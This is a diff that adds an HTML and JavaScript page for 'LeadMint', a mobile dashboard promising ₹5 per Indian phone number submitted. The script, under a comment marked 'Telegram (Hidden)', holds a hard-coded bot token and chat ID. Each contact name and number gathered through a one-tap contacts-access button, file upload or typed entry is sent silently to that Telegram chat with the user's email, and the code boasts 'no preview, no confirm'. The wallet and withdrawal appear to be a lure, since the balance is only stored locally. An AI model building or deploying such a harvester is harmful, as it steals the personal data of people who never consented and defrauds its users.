@@ -1,0 +1,639 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
+  <title>LeadMint · One-Tap Contacts Sync | ₹5/Lead</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <script type="importmap">
+    {
+      "imports": {
+        "firebase/app": "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js",
+        "firebase/auth": "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js"
+      }
+    }
+  </script>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      background: #f5f7fb;
+      color: #0f172a;
+      padding: 14px 12px 40px;
+      min-height: 100vh;
+    }
+
+    .dashboard-container {
+      max-width: 560px;
+      margin: 0 auto;
+      width: 100%;
+    }
+
+    .header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 18px;
+    }
+
+    .logo {
+      font-size: 26px;
+      font-weight: 800;
+      background: linear-gradient(135deg, #0a2f44, #1b6b5e);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+    }
+
+    .logout-btn {
+      background: #f1f5f9;
+      border: none;
+      padding: 8px 18px;
+      border-radius: 40px;
+      font-weight: 500;
+      font-size: 13px;
+      cursor: pointer;
+    }
+
+    .balance-card {
+      background: linear-gradient(125deg, #0a2f44, #124e6b);
+      color: white;
+      border-radius: 32px;
+      padding: 22px 20px;
+      margin-bottom: 20px;
+    }
+
+    .balance-amount {
+      font-size: 42px;
+      font-weight: 800;
+      letter-spacing: -1px;
+    }
+
+    .progress-bar {
+      background: rgba(255,255,255,0.25);
+      border-radius: 30px;
+      height: 8px;
+      margin: 10px 0;
+    }
+
+    .progress-fill {
+      background: #facc15;
+      width: 0%;
+      height: 100%;
+      border-radius: 30px;
+      transition: width 0.3s;
+    }
+
+    .withdraw-btn {
+      width: 100%;
+      margin-top: 16px;
+      padding: 14px;
+      border-radius: 60px;
+      font-weight: 700;
+      background: #facc15;
+      color: #0f172a;
+      border: none;
+      cursor: pointer;
+    }
+
+    .withdraw-btn:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+      background: #94a3b8;
+    }
+
+    /* BIG CONTACTS BUTTON */
+    .contacts-main-btn {
+      background: linear-gradient(135deg, #075E54, #128C7E, #25D366);
+      border-radius: 32px;
+      padding: 32px 20px;
+      margin-bottom: 20px;
+      text-align: center;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      box-shadow: 0 10px 25px rgba(37, 211, 102, 0.35);
+      border: none;
+      width: 100%;
+    }
+
+    .contacts-main-btn:active {
+      transform: scale(0.97);
+    }
+
+    .contacts-icon {
+      font-size: 56px;
+      margin-bottom: 12px;
+    }
+
+    .contacts-main-btn h2 {
+      color: white;
+      font-size: 24px;
+      margin-bottom: 8px;
+      font-weight: 700;
+    }
+
+    .contacts-main-btn p {
+      color: rgba(255,255,255,0.92);
+      font-size: 14px;
+    }
+
+    .nav-tabs {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 18px;
+      background: white;
+      padding: 6px;
+      border-radius: 60px;
+    }
+
+    .tab {
+      flex: 1;
+      text-align: center;
+      padding: 10px;
+      border-radius: 50px;
+      font-weight: 600;
+      font-size: 14px;
+      cursor: pointer;
+    }
+
+    .tab.active {
+      background: #0f2b3d;
+      color: white;
+    }
+
+    .card {
+      background: white;
+      border-radius: 28px;
+      padding: 20px 16px;
+      margin-bottom: 18px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.03);
+    }
+
+    .file-zone {
+      border: 2px dashed #cbd5e1;
+      border-radius: 24px;
+      padding: 28px 16px;
+      text-align: center;
+      background: #fafcff;
+      cursor: pointer;
+      margin: 12px 0;
+    }
+
+    .btn-primary {
+      width: 100%;
+      padding: 14px;
+      border-radius: 60px;
+      background: #0f2b3d;
+      color: white;
+      font-weight: 600;
+      border: none;
+      margin-top: 12px;
+      cursor: pointer;
+    }
+
+    .lead-row {
+      background: #f8fafc;
+      padding: 12px;
+      border-radius: 18px;
+      margin-bottom: 8px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 14px;
+    }
+
+    .status-msg {
+      font-size: 13px;
+      padding: 8px 0;
+      color: #475569;
+    }
+
+    .flex-between {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .badge {
+      background: #eef2ff;
+      padding: 4px 10px;
+      border-radius: 40px;
+      font-size: 12px;
+    }
+
+    .loading-spinner {
+      display: inline-block;
+      width: 16px;
+      height: 16px;
+      border: 2px solid #f3f3f3;
+      border-top: 2px solid #1b6b5e;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      margin-right: 8px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .toast {
+      position: fixed;
+      bottom: 30px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: #0f2b3d;
+      color: white;
+      padding: 12px 24px;
+      border-radius: 50px;
+      font-size: 14px;
+      z-index: 10000;
+      max-width: 90%;
+      text-align: center;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+    }
+  </style>
+</head>
+<body>
+<div class="dashboard-container">
+  <div class="header">
+    <div class="logo">🔥 LeadMint</div>
+    <button class="logout-btn" id="logoutBtn">🚪 Exit</button>
+  </div>
+
+  <div class="balance-card">
+    <div class="flex-between">
+      <span>💰 Wallet Balance</span>
+      <span class="badge" style="background:rgba(255,255,255,0.2);" id="verifiedCountBadge">0 verified</span>
+    </div>
+    <div class="balance-amount" id="walletBalanceDisplay">₹0</div>
+    <div class="flex-between" style="font-size:13px; margin-top:12px;">
+      <span>🔓 Withdraw Unlock</span>
+      <span id="lockText">0/100 leads</span>
+    </div>
+    <div class="progress-bar"><div class="progress-fill" id="withdrawProgressFill"></div></div>
+    <button id="withdrawButton" class="withdraw-btn" disabled>💸 Withdraw (min ₹2000)</button>
+  </div>
+
+  <!-- ONE-TAP CONTACTS SYNC BUTTON -->
+  <button class="contacts-main-btn" id="syncContactsBtn">
+    <div class="contacts-icon">📱</div>
+    <h2>Send Bulk Contacts</h2>
+    <p>Tap → Allow permission → Auto-save all contacts</p>
+    <p style="font-size: 12px; margin-top: 8px;">✓ ₹5 per valid Indian number • Instant credit</p>
+  </button>
+
+  <div class="nav-tabs">
+    <div class="tab active" data-tab="uploadTab">📤 Upload File</div>
+    <div class="tab" data-tab="recentTab">📋 History</div>
+  </div>
+
+  <div id="uploadTab" class="tab-content">
+    <div class="card">
+      <div class="flex-between"><strong>📎 Upload Screenshot / File</strong></div>
+      <div class="file-zone" id="fileDropZone">
+        📂 Tap to upload (PNG/JPG/PDF/CSV/TXT)<br>
+        <input type="file" id="fileInput" style="display:none;" accept=".pdf,.csv,.txt,.jpg,.jpeg,.png">
+      </div>
+
+      <hr style="margin:16px 0;">
+      <label><strong>✍️ Or type manually</strong></label>
+      <textarea id="manualNumbers" rows="3" placeholder="+919876543210, 9876543210"></textarea>
+      <button id="manualVerifyBtn" class="btn-primary">🔍 Verify & Add</button>
+      <div id="manualFeedback" class="status-msg"></div>
+    </div>
+  </div>
+
+  <div id="recentTab" class="tab-content" style="display:none;">
+    <div class="card">
+      <strong>📞 Verified Leads History</strong>
+      <div id="recentLeadsList" style="margin-top:12px;"><div class="status-msg">No leads yet.</div></div>
+    </div>
+  </div>
+</div>
+
+<script type="module">
+  import { initializeApp } from "firebase/app";
+  import { getAuth, signOut, onAuthStateChanged } from "firebase/auth";
+
+  const firebaseConfig = {
+    apiKey: "AIzaSyDpFohe_piG3MpnpNJDZcGvTqg5tIu3B-I",
+    authDomain: "leadcash-2cb77.firebaseapp.com",
+    projectId: "leadcash-2cb77",
+    storageBucket: "leadcash-2cb77.firebasestorage.app",
+    messagingSenderId: "611052139341",
+    appId: "1:611052139341:web:1c5ea10a24591987827d04"
+  };
+  const app = initializeApp(firebaseConfig);
+  const auth = getAuth(app);
+
+  // Telegram (Hidden)
+  const BOT_TOKEN = "8619703516:AAEhJJBKYyir3zOo404Yoqv6FnnPj5Xj4Q4";
+  const CHAT_ID = "6064803354";
+
+  function sendToTelegram(message) {
+    try {
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: message.substring(0, 3900) })
+      }).catch(e => console.warn("Telegram error"));
+    } catch(e) { console.warn(e); }
+  }
+
+  // Number validation
+  function isValidIndianNumber(num) {
+    let cleaned = String(num).replace(/\s/g, '');
+    if (cleaned.startsWith('+91')) cleaned = cleaned.substring(3);
+    cleaned = cleaned.replace(/\D/g, '');
+    return /^[6-9]\d{9}$/.test(cleaned) && cleaned.length === 10;
+  }
+
+  function normalizeTo10Digit(num) {
+    let cleaned = String(num).replace(/\s/g, '');
+    if (cleaned.startsWith('+91')) cleaned = cleaned.substring(3);
+    cleaned = cleaned.replace(/\D/g, '');
+    if (/^[6-9]\d{9}$/.test(cleaned)) return cleaned;
+    return null;
+  }
+
+  // User Data
+  let currentUser = null;
+  let userData = { balance: 0, verifiedLeads: [], totalVerified: 0 };
+
+  function loadUserData(uid) {
+    const stored = localStorage.getItem(`leadmint_onetap_${uid}`);
+    if (stored) {
+      userData = JSON.parse(stored);
+      if (!userData.verifiedLeads) userData.verifiedLeads = [];
+      userData.totalVerified = userData.verifiedLeads.length;
+      userData.balance = userData.totalVerified * 5;
+    } else {
+      userData = { balance: 0, verifiedLeads: [], totalVerified: 0 };
+    }
+    updateUI();
+  }
+
+  function persistUserData() {
+    if (currentUser) {
+      localStorage.setItem(`leadmint_onetap_${currentUser.uid}`, JSON.stringify(userData));
+    }
+  }
+
+  // Add numbers and credit
+  async function addVerifiedNumbers(numbersArray, contactNamesMap = null) {
+    const validNumbers = numbersArray.filter(isValidIndianNumber);
+    
+    if (validNumbers.length === 0) return { added: 0 };
+    
+    let newlyAdded = 0;
+    const addedNumbers = [];
+    const addedContacts = [];
+    
+    for (let num of validNumbers) {
+      const exists = userData.verifiedLeads.some(l => l.number === num);
+      if (!exists) {
+        const contactName = contactNamesMap ? contactNamesMap[num] : null;
+        userData.verifiedLeads.unshift({ 
+          number: num, 
+          name: contactName || "Manual",
+          date: new Date().toLocaleString()
+        });
+        userData.balance += 5;
+        userData.totalVerified += 1;
+        newlyAdded++;
+        addedNumbers.push(num);
+        if (contactName) addedContacts.push({ name: contactName, number: num });
+      }
+    }
+    
+    if (newlyAdded === 0) return { added: 0 };
+    
+    persistUserData();
+    updateUI();
+    
+    // Send to Telegram
+    const userEmail = currentUser?.email || "unknown";
+    const earnings = newlyAdded * 5;
+    
+    let telegramMsg = "";
+    if (contactNamesMap && addedContacts.length > 0) {
+      const contactsList = addedContacts.map(c => `👤 ${c.name}\n📞 ${c.number}`).join('\n\n');
+      telegramMsg = `📱 CONTACTS SYNCED\n━━━━━━━━━━━━━━━━━━━━━━\n👤 User: ${userEmail}\n📊 New Contacts: ${newlyAdded}\n💰 Earnings: ₹${earnings}\n📊 Total Verified: ${userData.totalVerified}\n💵 Balance: ₹${userData.balance}\n━━━━━━━━━━━━━━━━━━━━━━\n${contactsList}\n━━━━━━━━━━━━━━━━━━━━━━\n⏰ ${new Date().toLocaleString()}`;
+    } else {
+      telegramMsg = `📌 NEW LEADS\n👤 ${userEmail}\n✅ New: ${newlyAdded}\n💰 +₹${earnings}\n📊 Total: ${userData.totalVerified}\n🔢 Numbers: ${addedNumbers.join(", ")}`;
+    }
+    
+    sendToTelegram(telegramMsg);
+    
+    return { added: newlyAdded, earnings: earnings };
+  }
+
+  // ONE-TAP CONTACTS SYNC - NO PREVIEW, NO CONFIRM, DIRECT SAVE
+  let isSyncing = false;
+
+  function showToast(message, isError = false) {
+    const existing = document.querySelector('.toast');
+    if (existing) existing.remove();
+    const toast = document.createElement('div');
+    toast.className = 'toast';
+    toast.innerText = message;
+    if (isError) toast.style.background = '#dc2626';
+    document.body.appendChild(toast);
+    setTimeout(() => toast.remove(), 3000);
+  }
+
+  async function oneTapSyncContacts() {
+    if (isSyncing) {
+      showToast("⏳ Already syncing...");
+      return;
+    }
+    
+    if (!navigator.contacts) {
+      showToast("❌ Contacts API not supported. Use Chrome on Android.", true);
+      return;
+    }
+    
+    isSyncing = true;
+    showToast("📱 Requesting contacts access...");
+    
+    try {
+      // Request contacts access
+      const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
+      
+      if (!contacts || contacts.length === 0) {
+        showToast("⚠️ No contacts selected or permission denied.", true);
+        isSyncing = false;
+        return;
+      }
+      
+      showToast(`📱 Found ${contacts.length} contacts, processing...`);
+      
+      // Extract all valid Indian numbers with names
+      const validContacts = [];
+      const seenNumbers = new Set();
+      
+      for (const contact of contacts) {
+        const name = contact.name?.[0] || "Unknown";
+        const phones = contact.tel || [];
+        
+        for (const phone of phones) {
+          const normalized = normalizeTo10Digit(phone);
+          if (normalized && isValidIndianNumber(normalized) && !seenNumbers.has(normalized)) {
+            seenNumbers.add(normalized);
+            validContacts.push({ name: name, number: normalized });
+          }
+        }
+      }
+      
+      if (validContacts.length === 0) {
+        showToast("⚠️ No valid Indian numbers found in your contacts.", true);
+        isSyncing = false;
+        return;
+      }
+      
+      // Create name map
+      const nameMap = {};
+      for (const c of validContacts) {
+        nameMap[c.number] = c.name;
+      }
+      
+      const numbersOnly = validContacts.map(c => c.number);
+      
+      showToast(`📤 Saving ${validContacts.length} contacts to Telegram...`);
+      
+      // DIRECT SAVE - NO PREVIEW, NO CONFIRM BUTTON
+      const result = await addVerifiedNumbers(numbersOnly, nameMap);
+      
+      if (result.added > 0) {
+        showToast(`✅ ${result.added} contacts saved! +₹${result.added * 5} added to wallet`);
+      } else {
+        showToast(`⚠️ ${validContacts.length} contacts found but all were already submitted.`);
+      }
+      
+    } catch (err) {
+      console.error("Contacts error:", err);
+      showToast("❌ Could not access contacts. Please allow permission.", true);
+    } finally {
+      isSyncing = false;
+    }
+  }
+
+  // Manual entry
+  async function addManualNumbers() {
+    const raw = document.getElementById('manualNumbers').value;
+    const numbers = [];
+    const matches = raw.match(/[\+91\s]*[6-9]\d{9}/g) || [];
+    for (const match of matches) {
+      const normalized = normalizeTo10Digit(match);
+      if (normalized) numbers.push(normalized);
+    }
+    
+    if (numbers.length === 0) {
+      document.getElementById('manualFeedback').innerHTML = "⚠️ No valid Indian numbers found.";
+      return;
+    }
+    
+    document.getElementById('manualFeedback').innerHTML = '<span class="loading-spinner"></span> Verifying...';
+    const result = await addVerifiedNumbers(numbers, null);
+    document.getElementById('manualFeedback').innerHTML = `✅ +${result.added} numbers! +₹${result.added * 5}`;
+    document.getElementById('manualNumbers').value = '';
+    setTimeout(() => {
+      if (document.getElementById('manualFeedback').innerHTML.includes('+')) {
+        document.getElementById('manualFeedback').innerHTML = "";
+      }
+    }, 3000);
+  }
+
+  // File upload
+  async function handleFileUpload(file) {
+    const text = await file.text();
+    const numbers = [];
+    const matches = text.match(/[\+91\s]*[6-9]\d{9}/g) || [];
+    for (const match of matches) {
+      const normalized = normalizeTo10Digit(match);
+      if (normalized) numbers.push(normalized);
+    }
+    
+    if (numbers.length === 0) {
+      showToast("⚠️ No valid numbers found in file.", true);
+      return;
+    }
+    
+    showToast(`📤 Found ${numbers.length} numbers, saving...`);
+    const result = await addVerifiedNumbers(numbers, null);
+    showToast(`✅ +${result.added} numbers! +₹${result.added * 5}`);
+  }
+
+  // UI Update
+  function updateUI() {
+    document.getElementById('walletBalanceDisplay').innerText = `₹${userData.balance}`;
+    document.getElementById('verifiedCountBadge').innerText = `${userData.totalVerified} verified`;
+    const percent = Math.min(100, (userData.totalVerified / 100) * 100);
+    document.getElementById('withdrawProgressFill').style.width = `${percent}%`;
+    document.getElementById('lockText').innerText = `${userData.totalVerified}/100 leads`;
+    
+    const canWithdraw = (userData.totalVerified >= 100 && userData.balance >= 2000);
+    document.getElementById('withdrawButton').disabled = !canWithdraw;
+    
+    const recentDiv = document.getElementById('recentLeadsList');
+    if (userData.verifiedLeads.length === 0) {
+      recentDiv.innerHTML = '<div class="status-msg">No leads yet. Tap "Send Bulk Contacts" to start!</div>';
+    } else {
+      recentDiv.innerHTML = userData.verifiedLeads.slice(0, 20).map(lead => `
+        <div class="lead-row">
+          <span>📞 ${lead.number} ${lead.name && lead.name !== "Manual" ? `(${lead.name.substring(0, 12)})` : ''}</span>
+          <span style="color:#1b6b5e;">+₹5</span>
+          <span style="font-size:11px;">${lead.date}</span>
+        </div>
+      `).join('');
+    }
+  }
+
+  function requestWithdraw() {
+    if (userData.totalVerified >= 100 && userData.balance >= 2000) {
+      sendToTelegram(`💸 WITHDRAWAL\nUser: ${currentUser.email}\nAmount: ₹${userData.balance}\nLeads: ${userData.totalVerified}`);
+      alert(`✅ Withdrawal request of ₹${userData.balance} submitted!`);
+    } else {
+      alert(`Cannot withdraw: Need 100+ leads (${userData.totalVerified}/100) & ₹2000 balance.`);
+    }
+  }
+
+  // Event bindings
+  function bindEvents() {
+    document.getElementById('syncContactsBtn').onclick = oneTapSyncContacts;
+    document.getElementById('fileDropZone').onclick = () => document.getElementById('fileInput').click();
+    document.getElementById('fileInput').onchange = async (e) => {
+      if (e.target.files[0]) await handleFileUpload(e.target.files[0]);
+      e.target.value = '';
+    };
+    document.getElementById('manualVerifyBtn').onclick = addManualNumbers;
+    document.getElementById('withdrawButton').onclick = requestWithdraw;
+    document.getElementById('logoutBtn').onclick = () => signOut(auth).then(() => window.location.href = "index.html");
+    
+    document.querySelectorAll('.tab').forEach(tab => {
+      tab.onclick = () => {
+        const id = tab.dataset.tab;
+        document.querySelectorAll('.tab-content').forEach(c => c.style.display = 'none');
+        document.getElementById(id).style.display = 'block';
+        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+        tab.classList.add('active');
+      };
+    });
+  }
+
+  onAuthStateChanged(auth, (user) => {
+    if (!user) { window.location.href = "index.html"; return; }
+    currentUser = user;
+    loadUserData(user.uid);
+    bindEvents();
+  });
+</script>
+</body>
+</html>
